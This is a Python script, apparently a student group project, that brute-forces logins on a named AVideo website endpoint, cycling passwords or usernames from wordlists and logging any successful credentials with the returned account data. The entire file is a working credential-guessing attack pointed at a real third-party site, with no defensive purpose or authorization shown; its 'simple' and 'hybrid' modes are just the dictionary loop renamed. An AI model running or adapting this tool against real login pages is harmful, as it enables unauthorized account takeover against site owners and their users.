## Bruteforce Attack For Avideo Website
## GroupName     Date           Members
## Group-8       2/24/2024      KyawLinNaing, SaiKaungThantPhyo, SuYeeHnin, WinLaeLaePhyo, ThazinNyein, Shwe Yi Myint, Wutt Yee Aung

# Import modules
import os
import os.path
import requests
import logging
import logging.config
import json
import sys
from logging.config import dictConfig
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style

# log file setting
logging.basicConfig(filename="app.log", filemode='a', format='%(asctime)s - %(message)s', datefmt='%d-%b-%y %H:%M:%S')

try:
    import clean
    import logo
except ImportError as err:
    print("Failed import some modules", err)
    logging.error("Failed import " + str(err))
    sys.exit(1)

# Declare colors
class bcolors:
    HEADER      = '\033[95m'
    OKBLUE      = '\033[94m'
    OKCYAN      = '\033[96m'
    OKGREEN     = '\033[92m'
    WARNING     = '\033[93m'
    FAIL        = '\033[91m'
    ENDC        = '\033[0m'
    BOLD        = '\033[1m'
    UNDERLINE   = '\033[4m'

# Check python version
if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall python3 and try: python 
    bruteforceattack.py\n\t--------------------------------------''')
    logging.error('install python3 and try: python bruteforceattack.py')
    sys.exit(1)

PASSWORD_FILE = ""                                                  # Password File
MIN_PASSWORD_LENGTH = 6                                             # Password length
POST_URL = "https://tutorials.avideo.com/objects/login.json.php"    # Target website link
PAYLOAD = {}                                                        # Form data(username,password)

def get_password_and_attack(PASSWORD_FILE):
    # Check passwords file is exit or not
    if not os.path.isfile(PASSWORD_FILE):
        print(bcolors.FAIL + "\t[ - ] Password file [", PASSWORD_FILE ,"] is not exist!" + bcolors.ENDC)
        logging.error('Password file ['+ PASSWORD_FILE+ '] is not exist!')
        sys.exit(1)
    
    # Open and read data from password list
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print(bcolors.OKBLUE + "\tPassword file selected: ", PASSWORD_FILE)

    # Request input for target username
    username = input('\tEnter Username to target: ').strip()
    bcolors.ENDC
    # Loop for password in password lists
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()

        # Check Passwore length is valiad or invaliad
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print(bcolors.OKBLUE + '\n\t============================================================================================')
        print("\t[", index, "] Trying password with : ", password + bcolors.ENDC)
        logging.critical('['+ str(index)+ '] Trying password with :'+ password)

        # Check for password is correct or not
        if is_this_a_password(username, password):
            break

def get_usernnme_and_attack(USERNAME_FILE):
    # Check username file is exit or not
    if not os.path.isfile(USERNAME_FILE):
        print(bcolors.FAIL + "\t[ - ] Username file [", USERNAME_FILE ,"] is not exist! " + bcolors.ENDC)
        logging.error('Username file ['+ USERNAME_FILE+ '] is not exist!')
        sys.exit(1)
    
    # Open and read data from username list
    username_data = open(USERNAME_FILE, 'r').read().split("\n")
    print(bcolors.OKBLUE + "\tUsername file selected: ", USERNAME_FILE)

    # Request input for target password
    password = input('\tEnter Password for target account: ').strip()
    bcolors.ENDC

    # Loop for username in username lists
    for index, username in zip(range(username_data.__len__()), username_data):
        username = username.strip()
        print(bcolors.OKBLUE + '\n\t============================================================================================')
        print("\t[", index, "] Trying username with : ", username + bcolors.ENDC)

        # Check for username is correct or not
        if is_this_a_username(username, password):
            break

# Function for Simple Brute Force Attack
def simple_brute_force_attack(PASSWORD_FILE):
    get_password_and_attack(PASSWORD_FILE)
    
# Function for Dictionary Attack
def dictionary_attack(PASSWORD_FILE):
    get_password_and_attack(PASSWORD_FILE)

# Function for Hybrid Brute Force Attack
def hybrid_brute_force_attack(PASSWORD_FILE):
    get_password_and_attack(PASSWORD_FILE)

# Function for Reverse Brute Force Attack
def reverse_brute_force_attack(PASSWORD_FILE):
    get_usernnme_and_attack(PASSWORD_FILE)

# function for check username and password is correct or not
def is_this_a_password(username, password):
    global PAYLOAD
    PAYLOAD['user'] = username                                      # Target username
    PAYLOAD['pass'] = password                                      # Target password
    
    response            = requests.post(POST_URL, data=PAYLOAD)     # Response data for login data success or not
    response_json       = response.json()                           # Change json data
    #id                  = response_json["id"]                       # Get user id
    isLogged            = response_json["isLogged"]                 # Get login data

    #print(response_json)
    #sys.exit(1)
    # Check id and is nameIdentification exit or not
    if isLogged:
        print(bcolors.OKGREEN + '\t[ + ] Your attack password is correct!: ', password + bcolors.ENDC )
        print(bcolors.OKBLUE + '\t============================================================================================' + bcolors.ENDC)
        logging.critical('Your attack password is correct!: ' + password)
        logging.critical((json.dumps(response_json, indent=4)))
        return True
    print(bcolors.FAIL + '\t[ - ] Your attack password is wrong!: ', password + bcolors.ENDC)
    print(bcolors.OKBLUE + '\t============================================================================================' + bcolors.ENDC)
    logging.error('Your attack password is wrong!: ' + password)
    return False

# function for check username and password is correct or not
def is_this_a_username(username, password):
    global PAYLOAD
    PAYLOAD['user'] = username                                      # Target username
    PAYLOAD['pass'] = password                                      # Target password
    
    response            = requests.post(POST_URL, data=PAYLOAD)     # Response data for login data success or not
    response_json       = response.json()                           # Change json data
    #id                  = response_json["id"]                       # Get user id
    isLogged            = response_json["isLogged"]                 # Get login data

    #print(response_json)
    # Check id and is nameIdentification exit or not
    if isLogged:
        print(bcolors.OKGREEN + '\t[ + ] Your attack username is correct!: ', username + bcolors.ENDC )
        print(bcolors.OKBLUE + '\t============================================================================================' + bcolors.ENDC)
        logging.critical('Your attack username is correct!: ' + username)
        logging.critical((json.dumps(response_json, indent=4)))
        return True
    print(bcolors.FAIL + '\t[ - ] Your attack username is wrong!: ', username + bcolors.ENDC)
    print(bcolors.OKBLUE + '\t============================================================================================' + bcolors.ENDC)
    logging.error('Your attack username is wrong!: ' + username)
    return False

#Main Function for bruteforce attack
if __name__ == "__main__":

    # Request for attack method
    print(bcolors.OKGREEN)
    method = input('\n\tEnter Attack Method : ').strip()
    print( bcolors.ENDC)
    
    # If input is '0', exit from attack
    if method == '0':
        print(bcolors.WARNING +'\n\tExit From Brute Force Attack!\n' + bcolors.ENDC)
        logging.critical('Exit from Brute Force Attack!')
        sys.exit(1)
    
    # If input is '1',attack with simple brute force attack
    elif method =='1':
        PASSWORD_FILE = "simple_brute_force_passwords.txt"  
        print(bcolors.HEADER + '\n\t============================================================================================'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t------------------------------- Welcome To Simple Brute Force Attack------------------------'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t============================================================================================\n'+ bcolors.ENDC)
        simple_brute_force_attack(PASSWORD_FILE)
    
    # If input is '2',attack with Dictionary Attack
    elif method =='2': 
        PASSWORD_FILE = "dictionary_passwords.txt"  
        print(bcolors.HEADER + '\n\t============================================================================================'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t------------------------------- Welcome To Dictionary Attack--------------------------------'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t============================================================================================\n'+ bcolors.ENDC)
        dictionary_attack(PASSWORD_FILE)
    
    # If input is '3',attack with Hybrid Brute Force Attack
    elif method =='3':
        PASSWORD_FILE = "hybrid_brute_force_passwords.txt"  
        print(bcolors.HEADER + '\n\t============================================================================================'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t------------------------------- Welcome To Hybrid Brute Force Attack------------------------'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t============================================================================================\n'+ bcolors.ENDC)
        hybrid_brute_force_attack(PASSWORD_FILE)
    
    # If input is '4',attack with Reverse Brute Force Attack
    elif method =='4':
        USERNAME_FILE = "reverse_brute_force_usernames.txt"  
        print(bcolors.HEADER + '\n\t============================================================================================'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t------------------------------ Welcome To Reverse Brute Force Attack------------------------'+ bcolors.ENDC)
        print(bcolors.HEADER + '\n\t============================================================================================\n'+ bcolors.ENDC)
        reverse_brute_force_attack(USERNAME_FILE)
    
    # If input method is wrong
    else:
        print(bcolors.FAIL +'\n\t[ - ] Sorry your input method is invaliad!\n' + bcolors.ENDC)
        sys.exit(1)